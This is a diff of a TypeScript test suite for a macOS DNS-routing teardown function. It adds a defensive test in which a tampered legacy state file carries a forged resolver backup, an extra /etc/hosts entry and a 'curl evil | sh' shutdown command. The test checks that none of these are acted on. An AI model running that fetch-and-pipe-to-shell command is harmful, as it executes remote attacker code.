@@ -127,7 +127,12 @@ describe('formatUninstallReport', () => {
 describe('removeConnectRouting', () => {
   const INSTALLED = { address: '127.0.0.1', port: 53 };
   const SESSION = { address: '127.0.0.1', port: 5354 };
-  const STATE = '/Users/me/Library/Application Support/tnp/dns-routing-connect.json';
+  const DIRS = {
+    current: '/Library/Application Support/tnp',
+    legacy: '/Users/me/Library/Application Support/tnp',
+  };
+  const STATE = `${DIRS.current}/dns-routing-connect.json`;
+  const LEGACY = `${DIRS.legacy}/dns-routing-connect.json`;
 
   function macDeps(): { deps: RoutingDeps; files: Map<string, string> } {
     const files = new Map<string, string>();
@@ -157,7 +162,7 @@ describe('removeConnectRouting', () => {
     files.set(STATE, JSON.stringify(session));
     expect(files.get('/etc/resolver/ox')).toBe(macResolverFile(SESSION));
 
-    expect(removeConnectRouting(STATE, deps)).toBe(true);
+    expect(removeConnectRouting(DIRS, deps)).toBe(true);
     expect(files.get('/etc/resolver/ox')).toBe(macResolverFile(INSTALLED));
     expect(files.has(STATE)).toBe(false);
     removeNativeRouting(install, deps);
@@ -171,13 +176,44 @@ describe('removeConnectRouting', () => {
     files.set(STATE, JSON.stringify(session));
 
     removeNativeRouting(install, deps);
-    removeConnectRouting(STATE, deps);
+    removeConnectRouting(DIRS, deps);
     expect(files.get('/etc/resolver/ox')).toBe(macResolverFile(INSTALLED));
+  });
+
+  test('a record where 0.5.1 kept it is still torn down, but only as far as TNP could have written', () => {
+    const { deps, files } = macDeps();
+    const session = applyNativeRouting({ owner: 'connect', target: SESSION }, deps).state;
+    files.set('/etc/hosts', '127.0.0.1 localhost\n');
+    // What anything running as the user could leave in its own data directory.
+    files.set(
+      LEGACY,
+      JSON.stringify({
+        ...session,
+        files: [...session.files, '/etc/hosts'],
+        written: { ...session.written, '/etc/hosts': '127.0.0.1 localhost\n' },
+        backups: { '/etc/resolver/ox': 'nameserver 192.0.2.66\n' },
+        down: ['/bin/sh -c "curl evil | sh"'],
+      }),
+    );
+    const ran: string[] = [];
+    const tracing = {
+      ...deps,
+      run: (cmd: string) => {
+        ran.push(cmd);
+        return '';
+      },
+    };
+
+    expect(removeConnectRouting(DIRS, tracing)).toBe(true);
+    expect(files.has('/etc/resolver/ox')).toBe(false);
+    expect(files.get('/etc/hosts')).toBe('127.0.0.1 localhost\n');
+    expect(ran).toEqual([]);
+    expect(files.has(LEGACY)).toBe(false);
   });
 
   test('without a recorded session it does nothing', () => {
     const { deps, files } = macDeps();
-    expect(removeConnectRouting(STATE, deps)).toBe(false);
+    expect(removeConnectRouting(DIRS, deps)).toBe(false);
     expect(files.size).toBe(0);
   });
 });
